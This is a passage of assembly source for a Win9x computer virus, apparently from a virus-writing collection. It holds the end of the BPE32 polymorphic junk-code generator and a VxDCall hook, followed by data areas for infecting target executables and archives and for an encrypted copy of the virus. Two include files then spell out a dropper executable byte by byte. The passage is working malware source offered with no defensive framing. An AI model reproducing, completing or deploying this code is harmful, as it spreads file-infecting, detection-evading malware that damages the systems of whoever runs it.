	push ecx		;JMP label2
	mov al, 0e8h		;junk
	stosb			;label1: junk
	push edi		;RET
	stosd			;junk
	push edi		;label2:
	call rjunkjc		;junk
	mov al, 0e9h
	stosb
	mov ecx, edi
	stosd
	mov ebx, edi
	call rjunkjc
	pop eax
	sub eax, edi
	neg eax
	mov edx, edi
	pop edi
	stosd
	mov edi, edx
	call rjunkjc
	mov al, 0c3h
	stosb
	call rjunkjc
	sub ebx, edi
	neg ebx
	xchg eax, ebx
	push edi
	mov edi, ecx
	stosd
	pop edi
	call rjunkjc
	pop ecx
	pop ebx
	pop edx
	ret
rjunk	endp
BPE32     EndP			;BPE32 ends here
VxDCall_hook	EndP


d1start:include drop1.inc
d1size = dword ptr $ - d1start

d2start:include drop2.inc
d2size = dword ptr $ - d2start


virus_end:
VxDCall0	dd	?
VxDCall_addr	db	6 dup (?)
targetname	db	MAX_PATH dup (?)
tmpname		db	8 dup (?)
header		db	4+IMAGE_SIZEOF_FILE_HEADER \
			+IMAGE_SIZEOF_NT_OPTIONAL_HEADER dup (?)
section_header	db	IMAGE_SIZEOF_SECTION_HEADER dup (?)

		db	512 dup (?)
threadstack:
virus_in_arc	db	3000h dup (?)
crypted_virus	db	2000h dup (?)
size_unint = $ - virus_end


workspace1	db	16 dup (?)
workspace2	db	16 dup (?)
ends
End first_gen
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[bg.asm]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[drop1.inc]ƒƒƒ
;First part of Win9X dropper
		db  4Dh	; M
		db  5Ah	; Z
		db  50h	; P
		db    0	;  
		db    2	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    4	;  
		db    0	;  
		db  0Fh	;  
		db    0	;  
		db 0FFh	;  
		db 0FFh	;  
		db    0	;  
		db    0	;  
		db 0B8h	; ∏
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  40h	; @
		db    0	;  
		db  1Ah	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    00ah
		db    029h
		db    000h
		db    030h
		db    0
		db    0
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    1	;  
		db    0	;  
		db    0	;  
		db 0BAh	; ∫
		db  10h	;  
		db    0	;  
		db  0Eh	;  
		db  1Fh	;  
		db 0B4h	; ¥
		db    9	;  
		db 0CDh	; Õ
		db  21h	; !
		db 0B8h	; ∏
		db    1	;  
		db  4Ch	; L
		db 0CDh	; Õ
		db  21h	; !
		db  90h	; ê
		db  90h	; ê
		db  54h	; T
		db  68h	; h
		db  69h	; i
		db  73h	; s
		db  20h	;  
		db  70h	; p
		db  72h	; r
		db  6Fh	; o
		db  67h	; g
		db  72h	; r
		db  61h	; a
		db  6Dh	; m
		db  20h	;  
		db  6Dh	; m
		db  75h	; u
		db  73h	; s
		db  74h	; t
		db  20h	;  
		db  62h	; b
		db  65h	; e
		db  20h	;  
		db  72h	; r
		db  75h	; u
		db  6Eh	; n
		db  20h	;  
		db  75h	; u
		db  6Eh	; n
		db  64h	; d
		db  65h	; e
		db  72h	; r
		db  20h	;  
		db  57h	; W
		db  69h	; i
		db  6Eh	; n
		db  33h	; 3
		db  32h	; 2
		db  0Dh	;  
		db  0Ah	;  
		db  24h	; $
		db  37h	; 7
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  50h	; P
		db  45h	; E
		db    0	;  
		db    0	;  
		db  4Ch	; L
		db    1	;  
		db    4	;  
		db    0	;  
		db 0C6h	; ∆
		db  24h	; $
		db  7Ch	; |
		db  5Fh	; _
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db 0E0h	; ‡
		db    0	;  
		db  8Eh	; é
		db  81h	; Å
		db  0Bh	;  
		db    1	;  
		db    2	;  
		db  19h	;  
		db    0	;  
		db  22h	; "
		db    0	;  
		db    0	;  
		db    0	;  
		db    4	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  40h	; @
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  40h	; @
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    2	;  
		db    0	;  
		db    0	;  
		db    1	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    3	;  
		db    0	;  
		db  0Ah	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  70h	; p
		db    0	;  
		db    0	;  
		db    0	;  
		db    4	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    2	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db  20h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  50h	; P
		db    0	;  
		db    0	;  
		db  54h	; T
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  60h	; `
		db    0	;  
		db    0	;  
		db  0Ch	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  43h	; C
		db  4Fh	; O
		db  44h	; D
		db  45h	; E
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  30h	; 0
		db    0	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  22h	; "
		db    0	;  
		db    0	;  
		db    0	;  
		db    6	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  20h	;  
		db    0	;  
		db    0	;  
		db 0E0h	; ‡
		db  44h	; D
		db  41h	; A
		db  54h	; T
		db  41h	; A
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  40h	; @
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  28h	; (
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  40h	; @
		db    0	;  
		db    0	;  
		db 0C0h	; ¿
		db  2Eh	; .
		db  69h	; i
		db  64h	; d
		db  61h	; a
		db  74h	; t
		db  61h	; a
		db    0	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  50h	; P
		db    0	;  
		db    0	;  
		db    0	;  
		db    2	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  28h	; (
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  40h	; @
		db    0	;  
		db    0	;  
		db 0C0h	; ¿
		db  2Eh	; .
		db  72h	; r
		db  65h	; e
		db  6Ch	; l
		db  6Fh	; o
		db  63h	; c
		db    0	;  
		db    0	;  
		db    0	;  
		db  10h	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  60h	; `
		db    0	;  
		db    0	;  
		db    0	;  
		db    2	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  2Ah	; *
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  40h	; @
		db    0	;  
		db    0	;  
		db  50h	; P
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[drop1.inc]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[drop2.inc]ƒƒƒ
;second part of Win9X dropper
		db 0FFh	;  
		db  25h	; %
		db  30h	; 0
		db  50h	; P
		db  40h	; @
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
